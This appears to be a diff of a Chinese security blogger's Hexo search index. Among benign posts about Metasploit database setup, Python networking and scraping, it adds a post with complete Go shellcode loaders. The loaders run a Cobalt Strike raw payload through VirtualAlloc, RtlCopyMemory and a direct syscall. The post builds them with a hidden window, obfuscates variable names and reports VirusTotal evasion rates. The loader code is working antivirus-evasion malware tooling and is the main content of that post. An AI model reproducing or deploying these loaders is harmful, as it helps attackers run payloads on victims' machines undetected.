syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>比较意外的是，这样子直接编译，2mb大小，免杀效果还不错<br>编译  </p>
-<ul>
-<li>go build -ldflags=”-H windowsgui” .\loader.go</li>
-</ul>
-<p>7/70 <a class="link" href="https://www.virustotal.com/gui/file/4aa8427eb6f6d8bd1308832081fef2012823c6e1dc464361b24babb7eed5fb91?nocache=1">https://www.virustotal.com/gui/file/4aa8427eb6f6d8bd1308832081fef2012823c6e1dc464361b24babb7eed5fb91?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>改了一些变量名</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	some <span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	ZXC = <span class="number">0x1000</span></span><br><span class="line">	VB  = <span class="number">0x2000</span></span><br><span class="line">	NM  = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	qwer  = <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">	tyui  = <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">	op    = <span class="string">&quot;VirtualAlloc&quot;</span></span><br><span class="line">	asdf  = <span class="string">&quot;RtlCopyMemory&quot;</span></span><br><span class="line">	kl32  = some.MustLoadDLL(qwer)</span><br><span class="line">	ntdll = some.MustLoadDLL(tyui)</span><br><span class="line">	opp   = kl32.MustFindProc(op)</span><br><span class="line">	ghjk  = ntdll.MustFindProc(asdf)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// go loader</span></span><br><span class="line">	addr, _, _ := opp.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), ZXC|VB, NM)</span><br><span class="line"></span><br><span class="line">	_, _, _ = ghjk.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">	some.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 17/70 https://www.virustotal.com/gui/file/453e468b4ea8d9fa64a8b18dd5120567fa962393424d3ca69a70c90f2bcbc124?nocache=1</span></span><br></pre></td></tr></table></figure>
-<p>不像python那样了，效果反而更差了</p>
-]]></content>
-  </entry>
-  <entry>
     <title>go笔记</title>
     <url>/2021/03/06/go%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14492860.html">源地址：https://www.cnblogs.com/This-is-Y/p/14492860.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -14332,6 +14459,32 @@ Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为�
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>go免杀笔记</title>
+    <url>/2022/07/29/go%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>参考：<br><a class="link" href="https://geektutu.com/post/quick-golang.html">https://geektutu.com/post/quick-golang.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.freebuf.com/sectool/328982.html">https://www.freebuf.com/sectool/328982.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/awsaaaq/GoBP">https://github.com/awsaaaq/GoBP<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>go读取shellcode，这里用的cs的x64 raw</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line">	fmt.Println(shellcode)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [252 72 131 228 13 212 67 250 25 171 144 13 92 …………………… 195 232 127 253 255 255 49 55 50 46 50 52 46 49 57 52 46 49 50 49 0 25 105 160 141 160 141]</span></span><br></pre></td></tr></table></figure>
+
+<p>shellcode loader</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// go loader</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	_, _, _ = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>更多人用的都是下面这样的loader,不过我不知道这两个if判断有什么实用性，就把它们给删了</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">	syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">	syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>比较意外的是，这样子直接编译，2mb大小，免杀效果还不错<br>编译  </p>
+<ul>
+<li>go build -ldflags=”-H windowsgui” .\loader.go</li>
+</ul>
+<p>7/70 <a class="link" href="https://www.virustotal.com/gui/file/4aa8427eb6f6d8bd1308832081fef2012823c6e1dc464361b24babb7eed5fb91?nocache=1">https://www.virustotal.com/gui/file/4aa8427eb6f6d8bd1308832081fef2012823c6e1dc464361b24babb7eed5fb91?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>改了一些变量名</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	some <span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	ZXC = <span class="number">0x1000</span></span><br><span class="line">	VB  = <span class="number">0x2000</span></span><br><span class="line">	NM  = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	qwer  = <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">	tyui  = <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">	op    = <span class="string">&quot;VirtualAlloc&quot;</span></span><br><span class="line">	asdf  = <span class="string">&quot;RtlCopyMemory&quot;</span></span><br><span class="line">	kl32  = some.MustLoadDLL(qwer)</span><br><span class="line">	ntdll = some.MustLoadDLL(tyui)</span><br><span class="line">	opp   = kl32.MustFindProc(op)</span><br><span class="line">	ghjk  = ntdll.MustFindProc(asdf)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// go loader</span></span><br><span class="line">	addr, _, _ := opp.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), ZXC|VB, NM)</span><br><span class="line"></span><br><span class="line">	_, _, _ = ghjk.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">	some.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 17/70 https://www.virustotal.com/gui/file/453e468b4ea8d9fa64a8b18dd5120567fa962393424d3ca69a70c90f2bcbc124?nocache=1</span></span><br></pre></td></tr></table></figure>
+<p>不像python那样了，效果反而更差了</p>
+]]></content>
   </entry>
   <entry>
     <title>htttp协议部分笔记</title>
@@ -15107,6 +15260,29 @@ Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为�
 ]]></content>
   </entry>
   <entry>
+    <title>msf启动显示 Nodatabase support：could not connect  to server connection refused</title>
+    <url>/2020/02/19/msf%E5%90%AF%E5%8A%A8%E6%98%BE%E7%A4%BA%20Nodatabase%20support%EF%BC%9Acould%20not%20connect%20%20to%20server%20connection%20refused/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12331180.html">源地址：https://www.cnblogs.com/This-is-Y/p/12331180.html<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20200219140526686-766021379.png" alt width="716" height="155">
+
+<p> </p>
+<p> 如图，在启动msf时，一般都会自动连接上数据库，今天偶然出现这种情况。解决办法大致如下：</p>
+<p>exit退出当前msf</p>
+<p>可以先用msfdb start</p>
+<p>检查一下是否启动：netstat -pandu | grep 5432</p>
+<p>没有启动的话，用service postgresql start来连接</p>
+<img src="1503868-20200219143027800-1343091653.png" alt>
+
+<p> 在msf中可以输入db_(tab)来查看可用的数据库命令</p>
+<img src="1503868-20200219143355807-535893405.png" alt>
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>log4j</title>
     <url>/2021/12/20/log4j/</url>
     <content><![CDATA[<p>参考：<br><a class="link" href="https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA">https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA<i class="fas fa-external-link-alt"></i></a></p>
@@ -15163,29 +15339,6 @@ Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为�
 <p><img src="image-20211220152809339.png" alt="image-20211220152809339"></p>
 <p>检测到${连在一起后，进入log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\StrSubstitutor.class </p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>msf启动显示 Nodatabase support：could not connect  to server connection refused</title>
-    <url>/2020/02/19/msf%E5%90%AF%E5%8A%A8%E6%98%BE%E7%A4%BA%20Nodatabase%20support%EF%BC%9Acould%20not%20connect%20%20to%20server%20connection%20refused/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12331180.html">源地址：https://www.cnblogs.com/This-is-Y/p/12331180.html<i class="fas fa-external-link-alt"></i></a></p>
-<img src="1503868-20200219140526686-766021379.png" alt width="716" height="155">
-
-<p> </p>
-<p> 如图，在启动msf时，一般都会自动连接上数据库，今天偶然出现这种情况。解决办法大致如下：</p>
-<p>exit退出当前msf</p>
-<p>可以先用msfdb start</p>
-<p>检查一下是否启动：netstat -pandu | grep 5432</p>
-<p>没有启动的话，用service postgresql start来连接</p>
-<img src="1503868-20200219143027800-1343091653.png" alt>
-
-<p> 在msf中可以输入db_(tab)来查看可用的数据库命令</p>
-<img src="1503868-20200219143355807-535893405.png" alt>
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
   </entry>
   <entry>
     <title>mysql 的information_schame</title>
@@ -15735,83 +15888,6 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
 ]]></content>
   </entry>
   <entry>
-    <title>python UDP多线程通信，以及自己加的花里胡哨、乱七八糟的东西</title>
-    <url>/2021/03/12/python%20UDP%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%B7%B1%E5%8A%A0%E7%9A%84%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E3%80%81%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526761.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526761.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>简单的通信代码，发送，接收，转发，接收，发送。用python短短几行就可以解决</p>
-<p> </p>
-<p>服务器：</p>
-<p> </p>
-<p> 客户端：</p>
-<p> </p>
-<p> </p>
-<p> 过程非常简单，开启服务器，然后打开客户端，连接到服务器。客户端发送一段数据给服务器，服务器把数据转发回给客户端，还可以多开几个客户端。</p>
-<p>效果就是这样子</p>
-<img src="1503868-20210312211031948-1625764453.png" width="1200" loading="lazy">
-
-<p> </p>
-<p> 但是肯定不行，客户端与客户端之间不能通信，然后就有了下面的代码，这是在网上找到的，我自己写的逻辑没这么清晰，所以就借用了一下这哥们的</p>
-<p>博客地址：<a class="link" href="https://www.cnblogs.com/markjuruo/p/10101625.html">https://www.cnblogs.com/markjuruo/p/10101625.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>github：<a class="link" href="https://github.com/markjuruo/Python-UDP-Chating">https://github.com/markjuruo/Python-UDP-Chating<i class="fas fa-external-link-alt"></i></a></p>
-<p>客户端（版权消息也都留着，可以去看看他的，思路清晰）</p>
-<p> </p>
-<p> 服务器</p>
-<p> </p>
-<p> 效果挺不错，比上面要好，相当于是一个聊天室一样的结构，但是用着用着发现问题了，退出会卡死，所以就想着自己再改一改，优化一下退出的代码。</p>
-<p> </p>
-<p>然后就是现在这版的代码，注释写得非常详细了。</p>
-<p>首先，客户端是有两个线程，一个发送SEND，一个接收RECV。要关闭客户端的话，就要让两个线程都正常关闭，起初想用进程间的通信解决，queue队列，写着写着发现好像可以不用这么复杂。</p>
-<p>关闭的主要流程是，用户输入一个特殊代码，告诉客户端准备退出，然后客户端发送一个请求退出的消息给服务器，然后结束掉SEND线程。</p>
-<p>同时服务器接收到请求后，再单独发送一条消息给这个客户端，此时客户端的RECV线程中正在等待的recvfrom函数接收到这条消息。然后关闭RECV线程。</p>
-<p>至此，两个线程都关闭，然后执行s.close()，关闭套接字，客户端程序退出</p>
-<p>服务器的话就比较简单了，在所有的客户端都退出后，再选择是否退出就行了</p>
-<p> </p>
-<p>代码如下</p>
-<p>服务器：</p>
-<p> </p>
-<p> </p>
-<p> 客户端：</p>
-<p> </p>
-<p> 效果如下：</p>
-<img src="1503868-20210312222127156-1641504848.png" width="1200" loading="lazy">
-
-<p> 退出：</p>
-<img src="1503868-20210312222219445-1902128098.png" width="1200" loading="lazy">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python format() 格式化输出</title>
-    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>进制转换问题</strong></p>
-<p>二进制-Binary-b</p>
-<p>八进制-Octal-o</p>
-<p>十进制-Decimal-d</p>
-<p>十六进制-Hexadecimal-x</p>
-<p>效果如图</p>
-<img src="1503868-20201018092410558-702270383.png" alt>
-
-<p> </p>
-<p>代码👇</p>
-<p> </p>
-<p>位置匹配</p>
-<p>效果</p>
-<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
-
-<p> </p>
-<p>代码👇</p>
-<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>python 爬虫获取豆瓣电影排行榜前250并写入excel</title>
     <url>/2020/06/26/python%20%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E6%8E%92%E8%A1%8C%E6%A6%9C%E5%89%8D250%E5%B9%B6%E5%86%99%E5%85%A5excel/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13196523.html">源地址：https://www.cnblogs.com/This-is-Y/p/13196523.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -15880,21 +15956,54 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
 ]]></content>
   </entry>
   <entry>
-    <title>python写poc时的笔记</title>
-    <url>/2021/12/02/python%E5%86%99poc%E6%97%B6%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="requests请求"><a href="#requests请求" class="headerlink" title="requests请求"></a>requests请求</h3><p>在批量验证是，不要直接写<br>    rsp=request.get<br>这一块尽可能的使用try，同时设置timeout和verify<br>    verify=False, timeout=25<br>如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    rsp = requests.post(url=url,headers=headers,files=uploaddata,verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+    <title>python UDP多线程通信，以及自己加的花里胡哨、乱七八糟的东西</title>
+    <url>/2021/03/12/python%20UDP%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%B7%B1%E5%8A%A0%E7%9A%84%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E3%80%81%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526761.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526761.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单的通信代码，发送，接收，转发，接收，发送。用python短短几行就可以解决</p>
+<p> </p>
+<p>服务器：</p>
+<p> </p>
+<p> 客户端：</p>
+<p> </p>
+<p> </p>
+<p> 过程非常简单，开启服务器，然后打开客户端，连接到服务器。客户端发送一段数据给服务器，服务器把数据转发回给客户端，还可以多开几个客户端。</p>
+<p>效果就是这样子</p>
+<img src="1503868-20210312211031948-1625764453.png" width="1200" loading="lazy">
 
+<p> </p>
+<p> 但是肯定不行，客户端与客户端之间不能通信，然后就有了下面的代码，这是在网上找到的，我自己写的逻辑没这么清晰，所以就借用了一下这哥们的</p>
+<p>博客地址：<a class="link" href="https://www.cnblogs.com/markjuruo/p/10101625.html">https://www.cnblogs.com/markjuruo/p/10101625.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>github：<a class="link" href="https://github.com/markjuruo/Python-UDP-Chating">https://github.com/markjuruo/Python-UDP-Chating<i class="fas fa-external-link-alt"></i></a></p>
+<p>客户端（版权消息也都留着，可以去看看他的，思路清晰）</p>
+<p> </p>
+<p> 服务器</p>
+<p> </p>
+<p> 效果挺不错，比上面要好，相当于是一个聊天室一样的结构，但是用着用着发现问题了，退出会卡死，所以就想着自己再改一改，优化一下退出的代码。</p>
+<p> </p>
+<p>然后就是现在这版的代码，注释写得非常详细了。</p>
+<p>首先，客户端是有两个线程，一个发送SEND，一个接收RECV。要关闭客户端的话，就要让两个线程都正常关闭，起初想用进程间的通信解决，queue队列，写着写着发现好像可以不用这么复杂。</p>
+<p>关闭的主要流程是，用户输入一个特殊代码，告诉客户端准备退出，然后客户端发送一个请求退出的消息给服务器，然后结束掉SEND线程。</p>
+<p>同时服务器接收到请求后，再单独发送一条消息给这个客户端，此时客户端的RECV线程中正在等待的recvfrom函数接收到这条消息。然后关闭RECV线程。</p>
+<p>至此，两个线程都关闭，然后执行s.close()，关闭套接字，客户端程序退出</p>
+<p>服务器的话就比较简单了，在所有的客户端都退出后，再选择是否退出就行了</p>
+<p> </p>
+<p>代码如下</p>
+<p>服务器：</p>
+<p> </p>
+<p> </p>
+<p> 客户端：</p>
+<p> </p>
+<p> 效果如下：</p>
+<img src="1503868-20210312222127156-1641504848.png" width="1200" loading="lazy">
 
-<h3 id="multipart文件上传"><a href="#multipart文件上传" class="headerlink" title="multipart文件上传"></a>multipart文件上传</h3><p>   python发送一个文件上传的请求包，这里我使用的requests包，因为没找到直接在数据包里修改数据的办法，所以我采取的办法是先建立一个文件，在打开一个它。</p>
-<p>注意这里使用的是files=uploaddata，指定files，如果用的data，那就不是上传文件了。<del>（花了一小时在这上面，太憨憨了）</del></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">       <span class="comment"># f.write(&#x27;&lt;?php echo &quot;py&quot;;phpinfo();?&gt;\n&#x27;)</span></span><br><span class="line">       f.write(<span class="string">&#x27;hello world\n&#x27;</span>)</span><br><span class="line">   uploaddata = &#123;</span><br><span class="line">   	<span class="string">&#x27;Filedata&#x27;</span>:(<span class="string">&#x27;test.php&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;test2.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/jpeg&#x27;</span>) <span class="comment"># image或者file</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       rsp = requests.post(url=url,headers=headers,files=uploaddata,verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p> 退出：</p>
+<img src="1503868-20210312222219445-1902128098.png" width="1200" loading="lazy">
 
-
-
-
-
+<p> </p>
 ]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
   </entry>
   <entry>
     <title>python免杀复习</title>
@@ -15932,16 +16041,31 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
 ]]></content>
   </entry>
   <entry>
-    <title>python实时输入检测</title>
-    <url>/2021/10/11/python%E5%AE%9E%E6%97%B6%E8%BE%93%E5%85%A5%E6%A3%80%E6%B5%8B/</url>
-    <content><![CDATA[<p>简单说一下功能和缺点</p>
-<ul>
-<li>功能：可以实时检测输入的按键，不用按回车</li>
-<li>缺点：只能在linux下运行，windows下运行会报错ModuleNotFoundError: No module named ‘termios’，</li>
-</ul>
-<p>在windows上可以考虑使用wsl，子系统来运行代码，亲测有效，不过产生了一个新的小问题，ctrl+c没法停止程序了。所以写的时候可以留一个关键字用来跳出循环<br><img src="image-20211011161726975.png" alt="image-20211011161726975"></p>
-<p>上代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"><span class="keyword">import</span> termios</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readchar</span>():</span></span><br><span class="line">        fd = sys.stdin.fileno()</span><br><span class="line">        old_settings = termios.tcgetattr(fd)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                tty.setraw(sys.stdin.fileno())</span><br><span class="line">                ch = sys.stdin.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readkey</span>(<span class="params">getchar_fn=<span class="literal">None</span></span>):</span></span><br><span class="line">        getchar = getchar_fn <span class="keyword">or</span> readchar</span><br><span class="line">        c1 = getchar()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c1) != <span class="number">0x1b</span>:</span><br><span class="line">                <span class="keyword">return</span> c1</span><br><span class="line">        c2 = getchar()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c2) != <span class="number">0x5b</span>:</span><br><span class="line">                <span class="keyword">return</span> c1</span><br><span class="line">        c3 = getchar()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="number">0x10</span> + <span class="built_in">ord</span>(c3) - <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        key=readkey()</span><br><span class="line">        